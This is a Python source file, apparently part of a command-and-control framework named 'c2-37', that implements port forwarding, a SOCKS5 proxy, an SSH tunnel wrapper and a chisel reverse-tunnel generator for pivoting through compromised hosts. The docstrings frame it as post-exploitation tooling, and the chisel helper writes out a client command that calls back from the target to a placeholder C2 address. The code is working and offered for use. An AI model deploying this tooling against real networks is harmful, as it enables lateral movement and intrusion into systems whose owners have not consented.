"""c2-37 pivot — tunneling and proxy modules.

Provides SOCKS proxy and port forwarding through compromised agents.
Enables pivoting deeper into target networks.
"""
from __future__ import annotations

import json
import os
import socket
import struct
import subprocess
import threading
import time
from typing import Optional


class PortForward:
    """Forward a local port through the C2 channel to a target host:port.

    Operator runs: c37 forward <agent> <local_port> <target_host> <target_port>
    Traffic: operator:local_port -> C2 server -> agent -> target_host:target_port
    """

    def __init__(self, local_port: int, remote_host: str, remote_port: int):
        self.local_port = local_port
        self.remote_host = remote_host
        self.remote_port = remote_port
        self._server: Optional[socket.socket] = None
        self._running = False

    def start(self, background: bool = True):
        """Start the local port forwarder."""
        self._server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._server.bind(("127.0.0.1", self.local_port))
        self._server.listen(5)
        self._running = True

        if background:
            t = threading.Thread(target=self._accept_loop, daemon=True)
            t.start()
        else:
            self._accept_loop()

    def _accept_loop(self):
        while self._running:
            try:
                self._server.settimeout(1.0)
                client, addr = self._server.accept()
                t = threading.Thread(
                    target=self._handle_client,
                    args=(client,),
                    daemon=True
                )
                t.start()
            except socket.timeout:
                continue
            except Exception:
                break

    def _handle_client(self, client: socket.socket):
        """Handle a forwarded connection."""
        try:
            remote = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            remote.connect((self.remote_host, self.remote_port))
            # Bidirectional relay
            t1 = threading.Thread(target=self._relay, args=(client, remote), daemon=True)
            t2 = threading.Thread(target=self._relay, args=(remote, client), daemon=True)
            t1.start()
            t2.start()
            t1.join()
        except Exception:
            client.close()

    def _relay(self, src: socket.socket, dst: socket.socket):
        try:
            while True:
                data = src.recv(4096)
                if not data:
                    break
                dst.sendall(data)
        except Exception:
            pass
        finally:
            try:
                src.close()
            except Exception:
                pass
            try:
                dst.close()
            except Exception:
                pass

    def stop(self):
        self._running = False
        if self._server:
            self._server.close()

    def to_json(self) -> dict:
        return {
            "type": "port_forward",
            "local_port": self.local_port,
            "remote_host": self.remote_host,
            "remote_port": self.remote_port,
            "running": self._running,
        }


class Socks5Proxy:
    """SOCKS5 proxy server for pivoting through an agent.

    Runs locally, routes traffic through the C2 channel.
    Supports CONNECT method for TCP tunneling.
    """

    def __init__(self, port: int = 1080):
        self.port = port
        self._server: Optional[socket.socket] = None
        self._running = False
        self._connections = 0

    def start(self, background: bool = True):
        self._server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._server.bind(("127.0.0.1", self.port))
        self._server.listen(10)
        self._running = True

        if background:
            t = threading.Thread(target=self._accept_loop, daemon=True)
            t.start()
        else:
            self._accept_loop()

    def _accept_loop(self):
        while self._running:
            try:
                self._server.settimeout(1.0)
                client, addr = self._server.accept()
                self._connections += 1
                t = threading.Thread(
                    target=self._handle_socks,
                    args=(client,),
                    daemon=True
                )
                t.start()
            except socket.timeout:
                continue
            except Exception:
                break

    def _handle_socks(self, client: socket.socket):
        """Handle SOCKS5 handshake and connection."""
        try:
            # Greeting
            data = client.recv(2)
            if len(data) < 2 or data[0] != 0x05:
                client.close()
                return

            nmethods = data[1]
            client.recv(nmethods)  # methods

            # No auth required
            client.sendall(b"\x05\x00")

            # Request
            data = client.recv(4)
            if len(data) < 4 or data[0] != 0x05 or data[1] != 0x01:
                client.sendall(b"\x05\x07\x00\x01\x00\x00\x00\x00\x00\x00")
                client.close()
                return

            # Address type
            atyp = data[3]
            if atyp == 0x01:  # IPv4
                addr_data = client.recv(4)
                target_host = socket.inet_ntoa(addr_data)
            elif atyp == 0x03:  # Domain
                length = client.recv(1)[0]
                target_host = client.recv(length).decode()
            elif atyp == 0x04:  # IPv6
                addr_data = client.recv(16)
                target_host = socket.inet_ntop(socket.AF_INET6, addr_data)
            else:
                client.close()
                return

            port_data = client.recv(2)
            target_port = struct.unpack("!H", port_data)[0]

            # Connect to target
            try:
                remote = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                remote.settimeout(10)
                remote.connect((target_host, target_port))

                # Success response
                bind_addr = remote.getsockname()
                reply = b"\x05\x00\x00\x01"
                reply += socket.inet_aton(bind_addr[0])
                reply += struct.pack("!H", bind_addr[1])
                client.sendall(reply)

                # Relay
                t1 = threading.Thread(target=self._relay, args=(client, remote), daemon=True)
                t2 = threading.Thread(target=self._relay, args=(remote, client), daemon=True)
                t1.start()
                t2.start()
                t1.join()

            except Exception:
                # Connection refused
                client.sendall(b"\x05\x05\x00\x01\x00\x00\x00\x00\x00\x00")
                client.close()

        except Exception:
            try:
                client.close()
            except Exception:
                pass

    def _relay(self, src: socket.socket, dst: socket.socket):
        try:
            while True:
                data = src.recv(4096)
                if not data:
                    break
                dst.sendall(data)
        except Exception:
            pass
        finally:
            try:
                src.close()
            except Exception:
                pass
            try:
                dst.close()
            except Exception:
                pass

    def stop(self):
        self._running = False
        if self._server:
            self._server.close()

    def to_json(self) -> dict:
        return {
            "type": "socks5",
            "port": self.port,
            "running": self._running,
            "connections": self._connections,
        }


def ssh_tunnel(local_port: int, remote_host: str, remote_port: int,
               ssh_host: str, ssh_user: str = "root", ssh_key: str = None) -> subprocess.Popen:
    """Create an SSH tunnel (wrapper around ssh -L)."""
    cmd = [
        "ssh", "-N", "-L",
        f"{local_port}:{remote_host}:{remote_port}",
        f"{ssh_user}@{ssh_host}",
        "-o", "StrictHostKeyChecking=no",
    ]
    if ssh_key:
        cmd.extend(["-i", ssh_key])
    return subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)


def chisel_server(port: int = 8888) -> dict:
    """Generate chisel server command for reverse tunneling."""
    return {
        "server_cmd": f"chisel server --reverse --port {port}",
        "client_cmd": f"chisel client <C2_IP>:{port} R:socks",
        "description": "Run server on C2, client on target. Creates SOCKS proxy.",
    }
